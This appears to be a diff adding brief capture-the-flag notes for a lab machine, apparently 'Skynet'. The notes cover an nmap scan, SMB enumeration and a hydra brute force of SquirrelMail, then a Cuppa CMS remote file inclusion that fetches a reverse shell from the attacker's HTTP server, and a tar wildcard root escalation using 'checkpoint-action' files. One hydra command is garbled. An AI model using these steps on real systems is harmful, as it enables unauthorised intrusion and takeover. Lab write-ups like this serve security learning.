@@ -1,0 +1,66 @@
+nmap -sS IP
+
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http ***********
+110/tcp open  pop3
+139/tcp open  netbios-ssn
+143/tcp open  imap
+445/tcp open  microsoft-ds
+
+gobustter -u IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+
+/.hta (Status: 403)
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/admin (Status: 301)
+/config (Status: 301)
+/css (Status: 301)
+/index.html (Status: 200)
+/js (Status: 301)
+/server-status (Status: 403)
+/squirrelmail (Status: 301) **************
+
+smbmap -H IP
+ Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        anonymous                                               READ ONLY       Skynet Anonymous Share
+        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
+        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
+milesdyson share suggests username.
+anonymous share can be accessed
+smbclient \\IP\anonymous gives list of passwords in log1.txt
+
+use hyrdra to bruteforce squirrel mail with list of password
+hydra -l milesdyson -P log1.txt IP http-post "squirrelmhydra -l milesdyson -P log1.txt IP http-post-form "/squirrelmail/src/redirect.php:login=^USER^&secretkey=^PASS^&js_autodetect_results=0&just_logged-in=1:password incorrect"
+password for milesdyson share is in squirrelmail
+
+In squirrelmail is an email containing hidden http directory 
+cat important.txt 
+1. Add features to beta CMS /45kra24zxs28v3yd
+2. Work on T-800 Model 101 blueprints
+3. Spend more time with my wife
+
+IP/45kra24zxs28v3yd brings you to Cuppa CMS page
+Cuppa CMS is vulnerable to Remote File Inclusion
+look up the syntax of how to use Cuppa CMS Remote File Inclusion to execute php file on server side
+get php-reverse-shell.php file (modify IP and port)
+start a python http server to serve it
+python3 -m http.sever
+start another shell and listen on reverse shell script port 
+nc -lvp Port
+
+execute reverseshell and you're in
+stablize shell by using python to spawn bash shell
+pyhton -c "import pty;pty.spawn('/bin/bash')"
+
+get linpeas.sh on to target
+execute linpeas.sh to show cron job being run every minute as root to tar var/www/html 
+take advantage of tar wilcard priv esc and make root execute a script that allows /bin/bash to be run as setuid
+$printf "#!/bin/bash\nchmod +s /bin/bash" > shell.sh                                                                     
+$ echo "" > "--checkpoint-action=exec=sh shell.sh"                                                                        
+$ echo "" > --checkpoint=1
+
+DONE
+
